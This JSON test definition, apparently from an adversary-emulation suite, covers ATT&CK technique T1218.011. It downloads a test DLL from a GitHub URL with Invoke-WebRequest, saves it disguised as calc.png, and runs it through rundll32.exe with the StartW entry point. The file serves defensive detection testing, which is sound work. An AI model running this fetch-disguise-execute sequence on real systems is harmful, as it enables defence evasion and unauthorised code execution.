{
  "id": "ae3a8605-b26e-457c-b6b3-2702fd335bac",
  "name": "Execution of non-dll using rundll32.exe",
  "description": "Rundll32.exe running non-dll \n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "07f0a179-c609-41ea-ac20-ae1a889e1357",
      "type": "execute-command",
      "data": {
        "command": "rundll32.exe #{input_file}, StartW",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "a53ee9f2-3c40-4904-ad39-86d2d12004c3",
      "name": "Check dependency 1/1",
      "description": "Non-dll file must exist on disk at specified location\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path #{input_file}) {exit 0} else {exit 1}",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "2c2665ce-72ac-41e9-b7d7-e36155b2d3c3",
      "name": "Resolve dependency 1/1",
      "description": "Non-dll file must exist on disk at specified location\n",
      "type": "execute-command",
      "data": {
        "command": "Invoke-WebRequest \"#{input_url}\" -OutFile \"#{input_file}\"",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "4c16742a-429c-4c49-9dbd-b4fef78686f7",
      "name": "Re-check dependency 1/1",
      "description": "Non-dll file must exist on disk at specified location\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path #{input_file}) {exit 0} else {exit 1}",
        "command_type": "powershell"
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "a53ee9f2-3c40-4904-ad39-86d2d12004c3",
      "p": "on-success",
      "o": "07f0a179-c609-41ea-ac20-ae1a889e1357"
    },
    {
      "s": "a53ee9f2-3c40-4904-ad39-86d2d12004c3",
      "p": "on-failure",
      "o": "2c2665ce-72ac-41e9-b7d7-e36155b2d3c3"
    },
    {
      "s": "2c2665ce-72ac-41e9-b7d7-e36155b2d3c3",
      "p": "on-success",
      "o": "4c16742a-429c-4c49-9dbd-b4fef78686f7"
    },
    {
      "s": "4c16742a-429c-4c49-9dbd-b4fef78686f7",
      "p": "on-failure",
      "o": "07f0a179-c609-41ea-ac20-ae1a889e1357"
    }
  ],
  "tags": [
    "T1218",
    "T1218.011"
  ],
  "input_arguments": [
    {
      "name": "input_url",
      "type": "url",
      "description": "Url to download the DLL",
      "value": "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll"
    },
    {
      "name": "input_file",
      "type": "string",
      "description": "Non-dll file",
      "value": "C:\\Users\\$env:username\\Downloads\\calc.png"
    }
  ]
}